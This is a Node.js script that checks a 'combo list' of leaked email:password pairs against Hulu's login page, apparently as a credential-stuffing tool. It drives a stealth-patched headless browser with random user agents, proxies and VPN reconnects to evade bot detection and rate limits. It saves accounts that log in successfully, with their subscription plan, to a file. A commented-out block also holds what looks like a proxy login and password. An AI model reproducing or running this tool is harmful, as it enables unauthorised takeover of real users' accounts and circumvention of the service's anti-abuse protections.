const pool = require('./proxies.js')
const useProxy = require('puppeteer-page-proxy')
const fs = require('fs')
const sh = require('shelljs')
const regex = /.*@[a-z]*\.[a-z]{2,3}:\S*/gim
const Counts = require('./.count.json')
const random_useragent = require('random-useragent');
const argv = require('yargs')
  .option('source', {
    alias: 's',
    describe: 'combo list file to check',
    demandOption: true,
  })
  // .option('apiKey', {
  //   alias: 'k',
  //   describe: 'scrapinghub.com api key',
  //   demandOption: true,
  // })
  .option('debug', {
    alias: 'd',
    type: 'boolean',
    description: 'Run with debug output',
  })
  .option('timeout', {
    alias: 't',
    default: 30000,
    description: 'Time to wait for page loads',
  }).argv
var contents = fs.readFileSync(argv.source, 'utf8')

// console.log(contents.match(regex));
const logins = contents.match(regex)
console.log(logins)

const puppeteer = require('puppeteer-extra')

const enc = str => {
  return Buffer.from(str).toString('base64')
}

const dec = str => {
  return Buffer.from(str, 'base64').toString('ascii')
}

// add stealth plugin and use defaults (all evasion techniques)
const StealthPlugin = require('puppeteer-extra-plugin-stealth')
puppeteer.use(StealthPlugin())

// const counts = JSON.parse (Count);
// console.log(Counts)
for (var prop in Counts) {
  if (Counts.hasOwnProperty(prop)) {
    console.log(`${dec(prop)} Checked: ${Counts[prop]}`)
  }
}
var attempts = Counts[enc(argv.source)] ? Number(Counts[enc(argv.source)]) : 0
console.log(attempts)

console.log(`[DEBUG]: ${argv.debug ? 'ON' : 'OFF'}`)
console.log(`[TIMEOUT]: ${argv.timeout}`)

async function run(proxies) {
  //console.log(proxies)
  if (proxies && proxies.length) {
    //let random_number = Math.floor(Math.random() * 100)
    // console.log(proxies)
    var proxy = proxies[Math.floor(Math.random() * proxies.length)]

    //let proxy = `http://${proxies[random_number]}`
  }

  // let p = await getProxy('https://api.getproxylist.com/proxy?lastTested=600&anonymity[]=high%20anonymity&protocol[]=socks5&allowsHttps=1');

  // console.log(p)

  // p = JSON.parse(p);

  // let proxy = `socks5://${p.ip}:${p.port}`;
  if (proxies && proxies.length) {
    console.log(proxy)
  }

  const agent = random_useragent.getRandom(function (ua) {
    return ua.browserName === 'Firefox';
  });

  const pathToExtension = '/home/lifeofcoding/Repos/random-user-agent/extension'
  const args = [
    '--user-agent=' + agent,
    //'--proxy-server=x.botproxy.net:8080',
    // '--window-size=1920,1080',
    `--load-extension=${pathToExtension}`,
    '--no-sandbox',
    '--disable-setuid-sandbox',
    '--disable-infobars',
    '--window-position=0,0',
    '--ignore-certifcate-errors',
    '--ignore-certifcate-errors-spki-list',
    // `--proxy-server=${proxy}`,
  ]

  const options = {
    args,
    headless: !argv.debug ? true : false,
    ignoreHTTPSErrors: true,
    devtools: false,
    userDataDir: '.tmp',
    executablePath: '/usr/bin/brave-browser',
  }

  const browser = await puppeteer.launch(options)
  const context = await browser.createIncognitoBrowserContext()

  const page = await context.newPage()
  // page.authenticate({
      // username: 'pxu17652-0',
      // password: 'FssfRcSfOyKkrjNLA65m'
  // });

  page.on('console', msg => {
    for (let i = 0; i < msg.args().length; ++i)
      console.log(`${i}: ${msg.args()[i]}`)
  })

  // if (proxies && proxies.length) {
  //   await useProxy(page, proxy)
  // }

  try {
    await page.goto('https://www.hulu.com/welcome', {
      waitUntil: 'networkidle2',
      timeout: argv.timeout,
    })
  } catch (err) {
    console.warn('Summbitch.. hurry up!', err)
    return proxies && proxies.length ? run(proxies) : run();
  }

  // const preloadFile = fs.readFileSync('./preload.js', 'utf8')
  // await page.evaluateOnNewDocument(preloadFile)

  // await page.setViewport({width: 1080, height: 768});

  var userAgent = await page.evaluate(() => {
    return (function() {
      //console.log(window.navigator.userAgent)
      return window.navigator.userAgent
    })()
  })

  console.log('Using user-agent: ' + userAgent)

  await page.evaluate(() => {
    let btn = document.querySelector('.navigation__login-button')

    if (btn) {
      btn.click()
    }
  })

  // await page.click(".navigation__action-button");

  // email
  await page.waitForSelector('#email_id')

  let login = {
    email: logins[attempts].split(':')[0],
    pass: logins[attempts].split(':')[1],
  }
  console.log(`trying`, login)

  // await page.click("[name='username']");
  await page.type('#email_id', login.email, { delay: 200 })

  // passwordconsole.log(`trying ${logins[attempts].split(':')[0]} ${logins[attempts].split(':')[1]}`)
  await page.keyboard.down('Tab')

  // uncomment the following if you want the passwor dto be visible

  // page.$eval("._2hvTZ.pexuQ.zyHYP[type='password']", (el) => el.setAttribute("type", "text"));
  await page.keyboard.type(login.pass, { delay: 200 })

  // await page.click("button.login-button");
  await page.keyboard.press('Enter')

  const finishUp = async () => {
    await new Promise(r => setTimeout(r, 5000))
    setTimeout(() => {
      browser.close()
    }, 5000)

    if (attempts < logins.length) {
      ++attempts

      await fs.writeFileSync(
        '.count.json',
        JSON.stringify({ ...Counts, [enc(argv.source)]: attempts }),
        'utf8',
      )

      await new Promise(r => setTimeout(r, 10000))

      setTimeout(() => {
        run()
      }, 10000)
    }
  }

  page
    .waitForResponse('https://auth.hulu.com/v2/web/password/authenticate')
    .then(async response => {
      const url = response.url()
      //console.log(url);
      var body = null

      try {
        body = await response.text()
      } catch (err) {
        console.warn(err)
      }

      // console.log(body);
      if (body) {
        // console.log(body);
        try {
          const json = JSON.parse(body)
          //console.log(json);

          if (
            !json.error &&
            json.message === 'Your login is invalid. Please try again.'
          ) {
            console.warn('Failed...\n')
            finishUp()
          } else if (json.error && json.error === 'retry_limit') {
            //await sh.exec('nordvpn disconnect && nordvpn connect')
            finishUp()
          } else {
            //console.log("Logged in with", logins[attempts]);

            page
              .waitForResponse('https://www.hulu.com/api/v1/subscription')
              .then(async response => {
                const url = response.url()
                //console.log(url);
                var body = null

                try {
                  body = await response.text()
                } catch (err) {
                  console.warn(err)
                }

                // console.log(body);
                if (body) {
                  // console.log(body);
                  try {
                    const json = JSON.parse(body)
                    //console.log(json);

                    console.info(
                      'Found working account:',
                      `${login.email}:${login.pass} | ${json.subscription.plan.title}\n `,
                      json.subscription,
                      //JSON.stringify(json.subscription.plan.items),
                      //JSON.stringify(json.subscription.addOns.items),
                    )
                    fs.appendFileSync(
                      'working.txt',
                      `${login.email}:${login.pass} | ${json.subscription.plan.title}\n `,
                      'utf8',
                    )
                  } catch (err) {}
                }

                finishUp()
              })

            await page.goto('https://secure.hulu.com/account', {
              waitUntil: 'networkidle2',
              timeout: argv.timeout,
            })
          }
        } catch (e) {}

        await page.keyboard.down('Control')
        await page.keyboard.press('w')
        await page.keyboard.up('Control')

        // await page.waitFor(5000);

        // await browser.close();
      } else {
        --attempts
        finishUp()
      } // if body
    })

  try {
    await page.waitForSelector('.error-content-block', { timeout: 750 })
    console.log('captcha found')
  } catch (e) {
    //
  }

  // the selector of the "Login" button

  // await page.click("._0mzm-.sqdOP.L3NKy>.Igw0E.IwRSH.eGOV_._4EzTm");

  // we find the Login btn using the innerText comparison because the selector used for the btn might be unstable

  // await page.evaluate(() => {

  // let btns = [...document.querySelector(".login-button").querySelectorAll("button")];

  // btns.forEach(function (btn) {

  // if (btn.innerText == "LOG IN")

  // btn.click();

  // });

  // });

  // Optional

  // check if the element asking to download the app arises

  // try {

  // await loginPage.waitForSelector("._3m3RQ._7XMpj",{

  // timeout:3000

  // });

  // await loginPage.click("._3m3RQ._7XMpj");

  // } catch (err) {

  // }

  // Optional

  // check if the app asks for notifications

  // try {

  // await loginPage.waitForSelector(".aOOlW.HoLwm",{

  // timeout:5000

  // });

  // await loginPage.click(".aOOlW.HoLwm");

  // } catch (err) {

  // }

  // await page.waitForSelector(".glyphsSpriteMobile_nav_type_logo");

  // await page.waitForNavigation()

  // console.log('See screenshot: ' + screenshot)
}

// sh.exec('nordvpn connect', (output) => {

// console.log(output);
// pool(p => {
//   run(p)
// })
run()
// })

process.on('exit', code => {
  sh.exec('nordvpn connect', output => {
    console.log(output)
  })
})

